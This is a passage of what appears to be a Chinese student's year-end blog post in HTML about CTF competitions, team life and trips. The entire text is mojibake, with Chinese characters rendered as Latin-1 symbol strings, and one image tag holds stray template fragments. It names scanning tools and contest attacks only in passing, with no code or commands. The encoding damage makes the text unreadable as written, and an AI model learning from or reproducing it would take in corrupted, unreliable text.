title="æˆ‘çš„å›¾å›¾å‘¢"><p>è™½ç„¶æ¯”èµ›åŠçš„å¾ˆå±ï¼Œå¯æ˜¯è¿˜æ˜¯è§åˆ°äº† 23 å¹´å¹´åº•è®©åœˆåœˆç ´é˜²çš„ pazuris å¸ˆå‚…ï¼Œä¹ŸèŠäº†æŒºå¤šã€‚  </p><p>æ‰“å®Œçœèµ›çš„ä¸‹ä¸€å‘¨åˆè¦è·‘å»æ¡‚æ—æ‰“ CISCN åŠå†³èµ›äº†ï¼Œä¸è¿‡åªèƒ½è¯´ï¼ŒåŠçš„ä¹Ÿå¾ˆå±ã€‚æ‰“çš„æ˜¯ awdï¼Œ2 web 1 pwnï¼Œåˆæ˜¯ pwn æ‰‹ç ´é˜²å±€ã€‚ç„¶åæ¯ä¸ªé˜Ÿä¼é¶æœºçš„è´¦å·å¯†ç éƒ½æ˜¯ä¸€æ ·çš„ï¼Œæ¯”èµ›ä¸€å¼€å§‹ç›´æ¥ç»™äººæ‹¿è„šæœ¬æ”¹äº†ã€‚ä¸”ä¸è¯´å¼±å£ä»¤ï¼Œpwn é¶æœºå’Œå…¶ä¸­ä¸€ä¸ª web é¶æœºé€‰æ‰‹å±…ç„¶æ²¡æœ‰æƒé™ä¿®ï¼ï¼ï¼çœŸæ˜¯å±ä¸­å±ï¼Œå¯æ˜¯åœˆåœˆä»–ä»¬æ˜¯å† å†›ï¼ï¼ï¼  </p><img src="/2024/12/31/2024/6.jpg" class="" title="æˆ‘çš„å›¾å›¾å‘¢"><p>çœŸæ˜¯ç»™åœˆåœˆæ‰“çˆ½äº†ã€‚</p><img src="/2024/12/31/2024/27.jpg" class="" title="æˆ‘çš„å›¾å›¾å‘¢"><p>ä¸Šé¢è¿™ä¸ªå›¾æ²¡æœ‰åœˆåœˆå•Šï¼ˆç¬‘  </p><p>è¿˜æœ‰ä¸ºä»€ä¹ˆæ¡‚æ—ç”µå­ç§‘æŠ€å¤§å­¦ç¯å¢ƒè¿™ä¹ˆå¥½ï¼Œä½ å¸ˆä¸“çœŸæ˜¯ä»€ä¹ˆéƒ½æ¯”ä¸ä¸Šåˆ«äººå•ŠğŸ˜¡  </p><img src="/2024/12/31/2024/42.jpg" class="" title="æˆ‘çš„å›¾å›¾å‘¢"><p>ç»“æŸåçš„é‚£ä¸ªæ™šä¸Šåœˆåœˆã€unknownã€pazuris åœ¨é…’åº—é‡ŒèŠäº†å¥½å‡ ä¸ªå°æ—¶ï¼Œä¸»è¦å†…å®¹è¿˜æ˜¯å…³äºæœªæ¥çš„å‘å±•æ–¹å‘ï¼Œæ„Ÿæ¦‚æŒºå¤šçš„ï¼Œå…·ä½“å†…å®¹å°±ä¸åœ¨è¿™é‡Œè¯´äº†ã€‚  </p><p>è¿™ä¸ªå­¦æœŸåœˆåœˆä¹Ÿå‚åŠ äº†åˆ«çš„æ¯”èµ›ï¼Œå…¶ä¸­å°åƒæœ€æ·±çš„æ˜¯è“æ¡¥æ¯ã€‚åœˆåœˆä¸ºäº†å‚»é€¼çš„ä¿ç ”åŠ åˆ†å‚åŠ äº†è“æ¡¥æ¯çš„ CTF å’Œç®—æ³•ï¼Œç»“æœç®—æ³•æ‹¿äº†ä¸ªçœä¸€ï¼Œè€Œ CTF çœäºŒï¼ˆè¯„ä»·ä¸ºæ‰“ d3ctf çš„ php pwn æŠŠæˆ‘ gdb ç¯å¢ƒæç‚¸äº†ï¼Œç„¶åæ¯”èµ›æ–­ç½‘æçš„æˆ‘ä¸çŸ¥é“è¦æ€ä¹ˆä¿®ï¼‰ï¼Œéƒ½ä¸å¥½æ„æ€è¯´å‡ºå»ç»™äººå¬äº†ã€‚ç”±äºè¿™ä¸ªæ¯”èµ›å¤ªå‚»é€¼äº†ï¼ŒåŠ ä¸Šç®—æ³•çš„å†³èµ›å’Œ CTF çœèµ›åœ¨åŒä¸€ä¸ªæ˜ŸæœŸï¼Œäºæ˜¯æ‰¾äº†ä¸ªå€Ÿå£æŠŠç®—æ³•å†³èµ›ç»™ç¿˜äº†ï¼ˆè¾…å¯¼å‘˜è¿˜è’™åœ¨é¼“é‡ŒğŸ˜‹ã€‚  </p><p>è€ƒå®ŒæœŸæœ«åœˆåœˆåå’Œ HvAngã€Chimedal ä»å¤©æ²³åŒºéª‘è½¦åˆ°å¤§å­¦åŸï¼Œçƒ­åˆ°çˆ†ç‚¸ğŸ¥µğŸ¥µğŸ¥µ  </p><img src="/2024/12/31/2024/9.jpg" class="" title="æˆ‘çš„å›¾å›¾å‘¢"><p>å¯æ˜¯ç»¿è±†æ²™ä¹Ÿæ˜¯çœŸçš„å¥½å–ğŸ˜‹  </p><img src="/2024/12/31/2024/10.jpg" class="" title="æˆ‘çš„å›¾å›¾å‘¢"><p>å¾ˆå¿«åœˆåœˆå°±è¿æ¥äº†å¤§äºŒçš„æš‘å‡ï¼Œåœˆåœˆè®¤ä¸ºè¿™æ˜¯ä»–æœ‰å²ä»¥æ¥åº¦è¿‡çš„æœ€å¤±è´¥çš„ä¸€ä¸ªå‡æœŸï¼ˆæŒ‡çš„æ˜¯æ²¡æœ‰å­¦ä»€ä¹ˆä¸œè¥¿ï¼‰ã€‚ä¸ƒæœˆä»½åœ¨å‡†å¤‡ CISCN å†³èµ›ï¼Œåœ¨å­¦è½¦è”ç½‘ã€å¯ä¿¡è®¡ç®—ï¼ˆå‚»é€¼ç©æ„ï¼‰ã€å·¥æ§æµé‡åˆ†æã€‚åé¢ build ç¯èŠ‚æ¥äº†ï¼Œé˜Ÿå‹ä¸æ˜¯åœ¨å¿™å®ä¹ å°±æ˜¯åœ¨æä¿ç ”ï¼Œæœ€åå…¨æ˜¯åœˆåœˆä¸€ä¸ªäººæï¼Œæœ€ç»ˆ 75 åˆ†è¿˜å‹‰å¼ºçœ‹å¾—è¿‡å»ã€‚å†³èµ›ä¹Ÿæ‰“çš„æŒºæ†‹å±ˆçš„ï¼Œç¬¬ä¸€ä¸ª awdp æ„Ÿè§‰æˆ‘ä»¬çš„ break åˆ†éƒ½å‰åäº†ï¼Œå¯æ˜¯æ²¡ä»€ä¹ˆç»éªŒ fix å¾ˆæ…¢ï¼Œå¯¼è‡´æ¯”æŸäº› break 0 åˆ†çš„é˜Ÿä¼åˆ†æ•°è¿˜è¦ä½ã€‚ç¬¬äºŒçš„æ¸—é€æ›´åŠ çš„æ†‹å±ˆï¼Œé˜Ÿé‡Œçš„å¸ˆå‚…æ²¡æ‰“è¿‡äº‘å¢ƒï¼Œæ²¡æ‰“ä¸€éƒ¨éƒ½è¦èŠ±å¾ˆå¤šçš„æ—¶é—´ï¼Œæœ€ç»ˆå–œæä¸‰ç­‰å¥–ğŸ˜­ğŸ˜­ğŸ˜­ï¼ˆéƒ½ä¸å¥½æ„æ€å†™ç®€å†ä¸Šï¼‰<br>å®¶é™„è¿‘æ²¡æœ‰è·‘é“ï¼Œè€Œä¸”è·¯ä¸æ˜¯å¾ˆå¹³ï¼Œæ‰€ä»¥åœˆåœˆå°±å°†è¿åŠ¨æ–¹å¼æ”¹ä¸º CityBike ğŸ˜‹ã€‚åœˆåœˆæ¯å¤©å¸¦ç€ä»–çš„å°è½¦è½¦ï¼Œæ—©ä¸Šéª‘ï¼š  </p><img src="/2024/12/31/2024/8.jpg" class="7.jpg) æ™šä¸Šéª‘ï¼š {% asset_img" title="æˆ‘çš„å›¾å›¾å‘¢"><p>ç„¶åå’Œå®¶äººå»æ±Ÿè¥¿å’Œå®‰å¾½æ—…æ¸¸ï¼Œå»äº†å¾ˆå¤šæ™¯ç‚¹ï¼Œå…¶ä¸­æ™¯è‰²æœ€å¥½çš„æ„Ÿè§‰æ˜¯é»„å±±ï¼Œçˆ¬çš„æœ€ç´¯çš„æ˜¯ä¸‰æ¸…å±±ï¼ˆè¦æŠŠåœˆåœˆè„šç»™çˆ¬æ–­äº†ğŸ’€ï¼‰<br>é»„å±±ï¼š   </p><img src="/2024/12/31/2024/11.jpg" class="" title="æˆ‘çš„å›¾å›¾å‘¢"><p>æ¾é¼ ğŸ¥°ğŸ¥°</p><img src="/2024/12/31/2024/12.jpg" class="" title="æˆ‘çš„å›¾å›¾å‘¢"><p>è¿™é‡Œå¿˜è®°æ˜¯å“ªé‡Œäº†ï¼š</p><img src="/2024/12/31/2024/13.jpg" class="" title="æˆ‘çš„å›¾å›¾å‘¢"><p>åœˆåœˆè™½ç„¶ä¸€ç›´éƒ½å¿™çš„æŠ½ä¸å¼€èº«ï¼Œå¯æ˜¯ä»–ä¾ç„¶å¾ˆçæƒœå’Œå®¶äººä»¬çš„æ¯ä¸€æ¬¡æ—…è¡Œï¼Œå› ä¸ºä»–çŸ¥é“è¿™æ ·çš„æœºä¼šåœ¨æ…¢æ…¢çš„å‡å°‘ã€‚<br>å›½èµ›åçš„ä¸€ä¸ªæœˆé‡Œåœˆåœˆä¹Ÿå¿˜è®°ä»–å¹²äº†ä»€ä¹ˆï¼Œå‹‰å¼ºè®°å¾—ä»–å­¦äº† golang çš„è¯­æ³•ã€å‡ºäº†å‡ é“å¾ˆé˜´é—´çš„ pwn é¢˜ã€å’Œ unk ä¸€èµ·è‚äº†ä¸€ä¸ªæœˆçš„é€†å‘â€¦â€¦  </p><p>åœˆåœˆè¿™ä¸ªå‡æœŸæå‰äº†ä¸€ä¸ªæœˆå›æ ¡ï¼Œå’Œ HvAngã€Chimedal å»çˆ¬æµ·æ‹” 1296 km çš„æƒ å·ç½—æµ®å±±ã€‚æœ¬ä»¥ä¸ºå¯ä»¥å¾ˆå¿«ç™»é¡¶ï¼Œæ²¡æƒ³åˆ° HvAngã€Chimedal å¹³æ—¶ç¼ºä¹è¿åŠ¨ï¼Œå†åŠ ä¸Šä¸­é€”ä¸‹äº†å¥½å‡ æ¬¡å¤§é›¨ï¼Œçˆ¬äº†å¥½ä¹…æ‰ç™»é¡¶ã€‚<br>å±±é¡¶çš„é£æ™¯ä¹Ÿæ˜¯çœŸçš„å¥½çœ‹çš„è¯´ï¼Œä¸Šå›¾ï¼š  </p><img src="/2024/12/31/2024/14.jpg" class="" title="æˆ‘çš„å›¾å›¾å‘¢"><p>æ˜¯è°çˆ¬ä¸åŠ¨äº†é¸­ğŸ¤£ğŸ¤£ï¼š  </p><img src="/2024/12/31/2024/15.jpg" class="" title="æˆ‘çš„å›¾å›¾å‘¢"><p>ç§»åŠ¨çš„è›‹ç™½è´¨ï¼š  </p><img src="/2024/12/31/2024/16.jpg" class="" title="æˆ‘çš„å›¾å›¾å‘¢"><p>ä¸‹å±±çš„æ—¶å€™è¿æ°”å¥½çœ‹åˆ°äº†å½©è™¹ï¼š  </p><img src="/2024/12/31/2024/17.jpg" class="" title="æˆ‘çš„å›¾å›¾å‘¢"><p>å¤§äºŒä¸‹åœˆåœˆå¥½åƒä¹Ÿæ²¡å¹²ä»€ä¹ˆï¼Œæ²¡äº‹å¹²å¸®å¸® crazyman æ‰“æ‰“å›½é™…èµ›ï¼ŒåŸºæœ¬ä¸Šæ•´ä¸ªå­¦æœŸéƒ½åœ¨æå¼€å‘ï¼Œé¦–å…ˆæ˜¯ golang web å¼€å‘ï¼Œå­¦äº† ginã€gormã€gRPCã€go-micro ç­‰ä¸œè¥¿ï¼Œç„¶åæ‰¾ä¸ªäº†ç”± golang åšå®¢é¡¹ç›®ç»ƒäº†ä¸€ä¸‹æ‰‹ã€‚åé¢å‘ç°æå¼€å‘åªæ golang å¥½åƒä¹Ÿä¸å¤ªåˆé€‚ï¼Œç„¶ååˆå›åˆ°äº†å¤§äºŒä¸Šå­¦çš„ spring bootï¼ˆåœˆåœˆæ˜¯è§‰å¾—è¿™ä¸ª web æ¡†æ¶å†™èµ·æ¥éå¸¸çš„æ–¹ä¾¿ï¼Œå¯æ˜¯é›†æˆåº¦å¤ªé«˜äº†ï¼Œå†™èµ·æ¥æ€»æ„Ÿè§‰æ²¡æœ‰é€»è¾‘ï¼‰ï¼Œç»§ç»­è‡ªå·±æ‰¾é¡¹ç›®ç»ƒæ‰‹ã€‚å…¶é—´ä¹Ÿå¾ˆå¹¸è¿çš„åŠ å…¥åˆ°äº† W&amp;M è”åˆæˆ˜é˜Ÿï¼Œæ—¢ç„¶æ”¶ç•™äº†åœˆåœˆï¼Œé‚£åœˆåœˆå°±ä¸ºä»–å–å‘½æŠŠã€‚  </p><p>è¿™ä¸ªå­¦æœŸåœˆåœˆä¹Ÿæ˜¯æˆåŠŸå½“ä¸Šäº†åå—å¸ˆèŒƒå¤§å­¦ Sloth æˆ˜é˜Ÿçš„é˜Ÿé•¿äº†ï¼Œä»¥å‰åˆšåŠ å…¥ Sloth çš„æ—¶å€™ä¸€ç›´æƒ³ç€æ€ä¹ˆè°‹æƒç¯¡ä½å“ˆå“ˆå“ˆã€‚å½“ä¸Šé˜Ÿé•¿åæ„Ÿè§‰æŒºç´¯çš„ï¼Œå¼€å§‹å…³æ³¨æ¯ä¸€ä¸ªé˜Ÿå‘˜çš„å­¦ä¹ æƒ…å†µï¼Œå¹¶ç»™ä»–ä»¬å­¦ä¹ çš„å»ºè®®ï¼Œå¯æ˜¯æ•ˆæœå¾€å¾€éƒ½æ˜¯å¾ˆéš¾è¾¾åˆ°åœˆåœˆçš„æœŸæœ›ï¼Œæ¸æ¸çš„åœˆåœˆçš„å‘ç°ä»–è¯´è¯çš„è¯­æ°”è¶Šæ¥è¶Šå¼ºç¡¬ï¼Œæœ€ååœˆåœˆä¹Ÿæ˜¯çœ‹å¼€äº†ï¼Œè§‰å¾—å­¦ä¹ è¿™ç©æ„é åˆ«äººæ‹¿æªæŒ‡ç€æ²¡ä»€ä¹ˆæ„ä¹‰ï¼Œåé¢åœˆåœˆè¿˜æ˜¯è®©é˜Ÿå‘˜ä»¬è‡ªç”±å‘å±•ï¼Œä¸è¿‡è¿˜æ˜¯ä¼šç§¯æå›ç­”ä»–ä»¬æå‡ºçš„é—®é¢˜å¹¶ç»™å‡ºä¸€å®šçš„å»ºè®®ã€‚  </p><p>è¿™ä¸ªå­¦æœŸåœˆåœˆä¹Ÿæ‡’çš„åˆ·æ¯”èµ›äº†ï¼Œä»¥å‰åˆ·æ¯”èµ›æ˜¯ä¸ºäº†ä¿ç ”åŠ åˆ†ï¼Œåé¢å‘ç°è¿™æ ·å­çœŸçš„å¤ªæ¶ˆè€—æ—¶é—´äº†ï¼Œè€Œä¸”åœˆåœˆç´¯æ­»ç´¯æ´»æ‰“çš„æ¯”èµ›çš„åˆ†ä¸å¦‚å¾ˆå¤šäººæ‰“å‡ ä¸ªæ°´èµ›ç±»çš„å®¹æ˜“ï¼Œæ„Ÿè§‰ä¿ç ”é¡¶å¤šä¿æœ¬æ ¡ï¼Œå¤–æ ¡åŸºæœ¬æ²¡ä»€ä¹ˆå¯èƒ½ï¼Œè€Œåœˆåœˆå¹¶ä¸æƒ³ä¿æœ¬æ ¡ã€‚æ‰€ä»¥ç»å†äº†å¾ˆé•¿æ—¶é—´çš„å¿ƒé‡Œæ–—äº‰ï¼Œæœ€åè¿˜æ˜¯é€‰æ‹©è€ƒç ”ï¼Œåœˆåœˆè¿™ä¹ˆåšåªæ˜¯ä¸ºäº†ä¸“ç²¾äºè®¡ç®—æœºçš„ä¸€ä¸¤ä¸ªé¢†åŸŸï¼Œè€Œä¸æƒ³æ¯ä¸ªä¸œè¥¿éƒ½ä¼šä¸€ç‚¹è€Œä¸ç²¾ï¼ˆå½“ç„¶ä¹Ÿæœ‰äººèƒ½å¤Ÿåœ¨å¤šä¸ªæ–¹å‘ä¸Šä¸“ç²¾ï¼ŒåœˆåœˆçœŸçš„å¾ˆå´‡æ‹œä»–ä»¬ğŸ˜‡ï¼‰ã€‚  </p><p>å›½åº†èŠ‚çš„æ—¶å€™å¾—çŸ¥åˆä¸­åŒå­¦æœˆæœˆé¸Ÿæœå…µå½¹ç»“æŸäº†ï¼Œæ‰€ä»¥å«ä¸Šäº†ç„¦å“¥ä¸€èµ·åƒä¸ªé¥­ï¼Œæ²¡æƒ³åˆ°å¤šå¹´æœªè§çš„æ²¹æ¡ä¹Ÿæ¥äº†ğŸ¥°ğŸ¥°ğŸ¥°<br>è·Ÿç€å†›çˆ·æ—©èµ·çœ‹äº†ä¸€éƒ¨å……æ»¡çº¢è‰²æ­£èƒ½é‡çš„ç”µå½±ï¼Œç„¶åè€å¸æœºç„¦å“¥è½½æˆ‘ä»¬å‡ ä½å»åä¸ºå°é•‡é™„è¿‘æ•£æ­¥ã€‚  </p><img src="/2024/12/31/2024/22.jpg" class="" title="æˆ‘çš„å›¾å›¾å‘¢"><p>å¯æ˜¯è¿›ä¸å»ğŸ˜‡ğŸ˜…ï¼Œè·¯ä¸Šä¹ŸèŠäº†å¾ˆå¤šã€‚å¤šå¹´æœªè§ï¼Œç”šæ˜¯æ€€å¿µã€‚é«˜ä¸­å’Œå¤§å­¦éƒ½å¤ªå·äº†ï¼Œæ„Ÿè§‰éƒ½æ²¡æœ‰ç•™ä¸‹ä»€ä¹ˆç‰¹åˆ«å€¼å¾—å›å¿†çš„äº‹æƒ…ï¼ˆå½“ç„¶ä¹Ÿå¾ˆå¹¸è¿è®¤è¯†åˆ°äº†æ›´å¤šçš„äººï¼Œä¹Ÿæ‰¾åˆ°äº†è‡ªå·±æ–°çš„çˆ±å¥½ï¼‰ã€‚è¿˜è®°å¾—åˆä¸­æ¯•ä¸šå‰çº§é•¿åœ¨çº§ä¼šä¸Šè¯´çš„è¯ï¼šåœ¨ä»–è¯»ä¹¦çš„æ—¶å…‰é‡Œï¼Œåˆä¸­æ˜¯æœ€å¿«ä¹æœ€å€¼å¾—å›å¿†çš„ğŸ¥¹  </p><p>è¿™å­¦æœŸé™¤äº†å¹³æ—¶çš„ä¸Šè¯¾å­¦ä¹ å¤–å¥½åƒä¹Ÿæ²¡å¹²ä»€ä¹ˆäº‹æƒ…ï¼Œä¹Ÿæ‰“äº†å‡ æ¬¡çº¿ä¸‹èµ›ï¼š  </p><p>è·Ÿç€ W&amp;M å»å—äº¬æ‰“å¼ºç½‘æ‹Ÿæ€ï¼š   </p><img src="/2024/12/31/2024/18.jpg" class="" title="æˆ‘çš„å›¾å›¾å‘¢"><p>çŒœçŒœå“ªä¸ªæ˜¯åœˆåœˆğŸ˜‹  </p><p>æ¯”èµ›æ—¶æ—è¾¹æ˜¯çƒ§å–ï¼ˆè€Œä¸”åœˆåœˆæ—è¾¹åçš„æ˜¯ tel å¸ˆå‚…ğŸ¥¹ï¼‰ï¼Œå‹åŠ›æ‹‰æ»¡çš„è¯´  </p><img src="/2024/12/31/2024/34.jpg" class="" title="æˆ‘çš„å›¾å›¾å‘¢"><p>åœ¨å›é…’åº—çš„è½¦ä¸Šè°ƒè¯• io_uring æƒ³æŠ¢è¡€ï¼ˆæ‹æ‘„ by unkï¼‰ï¼š  </p><img src="/2024/12/31/2024/26.jpg" class="" title="æˆ‘çš„å›¾å›¾å‘¢"><p>å¯æƒœå¤§Bå“¥å—ä¼¤äº†æ²¡æ¥å‘œå‘œå‘œğŸ˜­ğŸ˜­ğŸ˜­ã€‚æ‹Ÿæ€çš„é¢˜æ„Ÿè§‰å¥‡å¥‡æ€ªæ€ªçš„ï¼ŒCTF æ‰“å®Œåå°±ä¸çŸ¥é“å¹²ä»€ä¹ˆäº†ã€‚æ— äººæœºæ²¡æ‰“æ˜ç™½ï¼Œå’Œæˆ‘å¹³æ—¶åšçš„ IOT ä¸ä¸€æ ·ï¼Œç„¶åä»€ä¹ˆè½¦è”ç½‘å•Šä»€ä¹ˆçš„æ¯”èµ›å‰è¯´æ˜¯çœ‹å»å¹´çš„æŠ¥é“åšé¢˜ï¼Œç„¶åå‘ç°å’Œå»å¹´åŸºæœ¬ä¸Šéƒ½ä¸ä¸€æ ·ã€‚äºæ˜¯åœˆåœˆå°±ç”¨ nmapã€fscanã€msf ä»€ä¹ˆçš„ä¸€é¡¿æ“ä½œçæäº† 3 å¤©â€¦â€¦ ä»¥åçš„æ‹Ÿæ€åœˆåœˆè¿˜æ˜¯ç•™åœ¨çº¿ä¸Šæ”¯æ´å§ğŸ˜…ï¼Œçº¿ä¸‹æœºä¼šç•™ç»™ IOT ğŸ‘´å»  </p><p>ç”±äºæ¯”èµ›æ—¶é—´å’Œç½‘é¼æ¯å†²æ’äº†ï¼Œæ‰€ä»¥åœˆåœˆç¬¬ä¸‰å¤©æ™šä¸Šå°±å’Œ Xp0int çš„ xswlhhh å¸ˆå‚…âœˆå»è´µé˜³äº†ï¼Œç•™ä¸‹äº† unk ä¸€ä¸ªäººç‹¬å®ˆæˆ˜åœºå‘œå‘œå‘œğŸ˜­ğŸ˜­ã€‚ç½‘é¼æ¯çš„è¿‡ç¨‹å°±ä¸æƒ³è¯´äº†ï¼Œåªèƒ½è¯´åœˆåœˆæåº¦è„‘æŠ½ï¼Œä¸ç„¶ Sloth å¯èƒ½å°±è¿›å†³èµ›äº†ğŸ˜‡ğŸ˜‡ğŸ˜‡ï¼Œä¸è¯´åˆ«çš„ï¼Œä¸Šå›¾ï¼š<br>æ‰“å®Œæ¯”èµ›åèµ›åœºå¤–çš„å¤œæ™¯ï¼š  </p><img src="/2024/12/31/2024/19.jpg" class="" title="æˆ‘çš„å›¾å›¾å‘¢"><p>ç„¶åå’Œæ¯•ä¸šçš„å¸ˆå…„å¸ˆå§ä»¬å»åƒé¥­ï¼Œä¸ƒä¸ªäººç‚¹äº†ä¸ªåäººé¤ï¼Œåå…­ä¸ªèœï¼Œå¤ªææ€–äº†ğŸ¤£ğŸ¤£ğŸ¤£ï¼ˆpanz0e å¿«å‡ºæ¥èƒŒé”…ï¼‰  </p><img src="/2024/12/31/2024/35.jpg" class="" title="æˆ‘çš„å›¾å›¾å‘¢"><p>æ™šä¸Šå’Œ V&amp;N çš„å…„å¼Ÿä»¬å»å”±Kï¼ˆV&amp;N å¥½å£°éŸ³ï¼‰ï¼š  </p><img src="/2024/12/31/2024/20.jpg" class="" title="æˆ‘çš„å›¾å›¾å‘¢"><p>å§æ§½å–ä¸åŠ¨äº†ï¼Œè¿™ç¾¤äººæ€ä¹ˆè¿™ä¹ˆèƒ½å–ğŸ˜¨  </p><img src="/2024/12/31/2024/37.jpg" class="" title="æˆ‘çš„å›¾å›¾å‘¢"><p>ä¹Ÿæ€»ç®—äº†è§åˆ° eeee å¸ˆå‚…äº†å‘œå‘œå‘œğŸ¥¹ğŸ¥¹ğŸ¥¹<br>è¿˜æœ‰åœˆåœˆæƒ³è¯´çš„æ˜¯ï¼Œxswlhhh å’Œ cnily03 å¸ˆå‚…å¯ä»¥å‡ºé“äº†å§ï¼Œå¤ªèƒ½å”±äº†ã€‚<br>æ­¤æ—¶é…’åº—å’ŒåœˆåœˆåŒä¸€é—´æˆ¿é—´çš„ HvAng é†’æ¥ï¼šåœˆåœˆäººæğŸ¤”ğŸ¤¯ğŸ˜¨ğŸ˜°ğŸ˜±  </p><p>çˆ¬å±±è§åˆ°äº†çŒ´å­å¤§ç‹ğŸ™ˆğŸ™‰ğŸ™ŠğŸµï¼ˆä¸€ç¾¤ï¼‰ï¼š  </p><img src="/2024/12/31/2024/21.jpg" class="" title="æˆ‘çš„å›¾å›¾å‘¢"><p>ä¸å¾—ä¸è¯´è¿™å‡ å¤©åœˆåœˆè¿˜æ˜¯è¿‡çš„éå¸¸å¼€å¿ƒçš„:)  </p><p>æ¥ä¸‹æ¥å°±æ˜¯éƒ‘å·çš„å¼ºç½‘æ¯ï¼Œåœˆåœˆç¬¬ä¸€æ¬¡äº†è§£åˆ°çš„ç½‘ç»œå®‰å…¨æ¯”èµ›å°±æ˜¯å¼ºç½‘æ¯ï¼Œæ²¡æƒ³åˆ°å±…ç„¶èƒ½å¤Ÿæœ‰æœºä¼šæ¥æ‰“å†³èµ›ã€‚åªèƒ½è¯´å°½åŠ›äº†â€¦â€¦ pwn å¯ä»¥è¯´å·²ç»æ‰“å®Œäº†ï¼ˆå…¨æ˜¯å¸¸è§„çš„ç”¨æˆ·æ€ pwn ğŸ¥¹ï¼šå±Œä¸èœå•é¢˜ä»¥åŠå‚»é€¼ qvm çš„å‚»é€¼è¿œç¨‹ç¯å¢ƒğŸ˜‡ï¼‰  </p><img src="/2024/12/31/2024/29.jpg" class="" title="æˆ‘çš„å›¾å›¾å‘¢"><p>ä¸Šé¢å·¦äºŒæ˜¯åœˆåœˆï¼ˆåˆ«ç»™æˆ‘çœ‹è§æœ‰äººä¸“é—¨å»å¼ºç½‘æ¯ç›¸å†Œé‡Œå»æ‰¾è¿™å¼ å›¾ç‰‡ğŸ˜¡<br>emmmâ€¦â€¦ è¿™é‡Œæ’ä¸€å˜´ï¼Œåœˆåœˆåœ¨å¼ºç½‘æ¯ç»™ inkey å¸ˆå‚…ç›’çš„è¿åº•è£¤éƒ½ä¸å‰©äº†ğŸ˜±ğŸ˜±ğŸ˜±  </p><img src="/2024/12/31/2024/36.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢"><p>ç›’åœˆåœˆæŠ€èƒ½ç‚¹æ•°æ‹‰æ»¡â¬†â¬†â¬†â¬†â¬†â¬†â¬†â¬†â¬†â¬†â¬†  </p><p>åªèƒ½è¯´æ‰“çš„å¾ˆéš¾å—ï¼Œrealworld çœŸçš„ä¸ä¼šæ‰“ï¼ˆltp å…¶å®ä¼šæ‰“ï¼Œå¯æ˜¯å½“æ—¶æ²¡çœ‹ğŸ˜…ï¼‰ï¼Œé‚£ç§æ— åŠ©å’Œç»æœ›ï¼Œä»¥åŠçœ‹åˆ°åˆ«çš„é˜Ÿä¼ä¸€ç›´ä¸Šå»æŒ‘æˆ˜çš„å‹åŠ›ï¼Œåœˆåœˆä¹Ÿè®¸ä¸€è¾ˆå­éƒ½ä¸ä¼šå¿˜è®°å§ğŸ˜”ã€‚  </p><p>æ‰“å®Œåå»é…’åº—æ‰¾å¹¿ä¸œè”é˜Ÿ S1uM4i ä»–ä»¬è¦é¼ æ ‡å«ï¼Œæ‹¿äº†å¥½å‡ å¼ ã€‚  </p><img src="/2024/12/31/2024/30.jpg" class="" title="æˆ‘çš„å›¾å›¾å‘¢"><p>å› ä¸ºå¤ªé‡ä¸æ–¹ä¾¿æ‹¿ï¼Œæ‰€ä»¥å°±é€äº†å¥½å‡ å¼ ç»™åˆ«äººğŸ¤£<br>åªèƒ½è¯´ï¼Œéƒ‘å·å¯¹äºä¸€ä¸ªå¹¿ä¸œäººæ¥è¯´æ˜¯çœŸçš„å†·ï¼Œæ‰“å®Œæ¯”èµ›çš„é‚£å¤©æ™šä¸Šä»–ä»¬è¯´è¦å»çœ‹é»„æ²³ï¼Œé‚£å°±å»å§ :)<br>é€”ä¸­ç»è¿‡ä¸€ä¸ªä»€ä¹ˆä¸å¤œåŸï¼Œå¯æ˜¯ç¯ä»€ä¹ˆçš„éƒ½å…³äº†ï¼Œæ„Ÿè§‰å°±åƒæ˜¯åœ¨ææ€–æ¸¸æˆé‡Œé¢ä¸€æ ·  </p><img src="/2024/12/31/2024/31.jpg" class="" title="æˆ‘çš„å›¾å›¾å‘¢"><p>ç„¶ååœˆåœˆä»–ä»¬èµ°å»é»„æ²³çš„è·¯ä¸Šä¹Ÿæ˜¯éå¸¸çš„é»‘  </p><img src="/2024/12/31/2024/32.jpg" class="" title="æˆ‘çš„å›¾å›¾å‘¢"><p>åˆ°äº†åé¢ç›´æ¥æ˜¯ç¯å…‰éƒ½æ²¡äº†<br>åªèƒ½è¯´å¤©ä¸Šéå¸¸å¤šçš„æ˜Ÿæ˜Ÿï¼Œåº”è¯¥æ˜¯æ²¡æœ‰å…‰æ±¡æŸ“çš„åŸå› ã€‚å¥½æƒ³æ‹ä¸‹æ¥ï¼Œå¯æ˜¯æ‰‹æœºç›¸æœºæ°´å¹³æœ‰é™ğŸ˜…<br>åˆ°é»„æ²³è¾¹äº†ï¼š  </p><img src="/2024/12/31/2024/33.jpg" class="" title="æˆ‘çš„å›¾å›¾å‘¢"><p>ä¸çŸ¥é“è¿™ä¸ªæ˜¯ç¥é­”ä¸œè¥¿ï¼Œå¯æ˜¯å½“æ—¶ unk çœ‹å¾—å¾ˆè®¤çœŸğŸ¤”  </p><img src="/2024/12/31/2024/41.jpg" class="" title="æˆ‘çš„å›¾å›¾å‘¢"><p>åœˆåœˆä¸€æ•´ä¸ªæ™šä¸Šéƒ½å¾ˆè‡ªè´£ï¼Œä¸€ç›´åœ¨è´¨é—®è‡ªå·±ä¸ºä»€ä¹ˆä¸€é“ realworld éƒ½æ²¡æœ‰åšå‡ºæ¥ï¼Œä¸ºä»€ä¹ˆåˆåœ¨æ‹–åè…¿ï¼ğŸ˜”<br>åœ¨ä»é»„æ²³å›é…’åº—çš„è½¦ä¸Šæ’­æ”¾ç€ Legends Never Dieï¼Œåœˆåœˆçœ‹ç€çª—å¤–é—ªçƒçš„ç¯å…‰ï¼Œä»–ä¸‹å®šå†³å¿ƒï¼Œä»–è¦å›æ¥å¤ä»‡ğŸ˜¡ğŸ‘ŠğŸ‘Šï¼Œä»–æ‰“ç®—æ²‰æ·€ä¸ªä¸¤å¹´ï¼Œç„¶åå›æ¥å¾æœ realworld ğŸ˜¡ğŸ‘ŠğŸ‘Š  </p><p>ç¬¬äºŒå¤©è€æ—©å°±èµ·åºŠå‡ºå‘èµ¶é£æœºï¼Œè®°å¾—å½“æ—¶å¥½åƒæ˜¯ 0~3Â°ï¼Œå†·æ­»åœˆåœˆè¿™ä¸ªå¹¿ä¸œäººäº†è¦ğŸ¥¶ã€‚èµ°çš„æ—¶å€™è·¯ä¸Šä¹Ÿæ²¡ä»€ä¹ˆè½¦ï¼Œæ„Ÿè§‰ååˆ†çš„å®‰é™  </p><img src="/2024/12/31/2024/39.jpg" class="" 